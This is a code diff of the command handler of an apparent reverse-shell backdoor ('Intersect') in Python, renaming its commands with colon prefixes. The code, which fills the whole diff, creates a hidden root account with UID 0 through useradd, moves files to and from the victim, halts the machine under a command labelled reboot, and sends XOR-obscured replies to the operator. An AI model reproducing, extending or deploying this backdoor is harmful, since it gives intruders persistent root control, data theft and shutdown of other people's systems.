@@ -48,13 +48,13 @@ def reversexor():
                 conn.send(xor("[!] Directory does not exist", PKEY)) 
                 conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
 
-        elif cmd2.startswith('adduser'):
+        elif cmd2.startswith(':addroot'):
             strip = cmd.split(" ")
             acct = strip[1]
             os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
             conn.send(xor("[+] Root account " + acct + " has been created.", PKEY))
 
-        elif cmd2.startswith('upload'):
+        elif cmd2.startswith(':upload'):
             getname = cmd2.split(" ")
             rem_file = getname[1]
             filename = rem_file.replace("/","_")
@@ -68,7 +68,7 @@ def reversexor():
             if not os.path.isfile(filename):
                 conn.send(xor("[!] File upload failed! Please try again", PKEY))
 
-        elif cmd2.startswith('download'):
+        elif cmd2.startswith(':download'):
             getname = cmd2.split(" ")
             loc_file = getname[1]
             if os.path.exists(loc_file) is True:
@@ -80,25 +80,18 @@ def reversexor():
             else:
                 conn.send(xor("[+] File not found!", PKEY))
 
-        elif cmd2.startswith("rebootsys"):
+        elif cmd2.startswith(":reboot"):
             conn.send(xor("[!] Server system is going down for a reboot!", PKEY))
             os.system("shutdown -h now")
  
-        elif cmd2 == ("extask"):
+        elif cmd2 == (":mods"):
             conn.send(xor(str(modList), PKEY))
             conn.send(xor("\nIntersect "+str(os.getcwd())+" => ", PKEY))
 
-        elif cmd2.startswith("extask"):
-            getname = cmd.split(" ")
-            modname = getname[1]
-            if modname in modList is False:
-                conn.send(xor("[!] Module not loaded!", PKEY))
-            else:
-                conn.send(xor("[+] Executing %s " % modname, PKEY))
-                execmod = modname+"()"
-                execmod
+        elif cmd2.startswith(":exec"):
+            pass
 
-        elif cmd2 == ('killme'):
+        elif cmd2 == (':killme'):
             conn.send(xor("[!] Shutting down shell!\n", PKEY))
             conn.close()
             sys.exit(0)
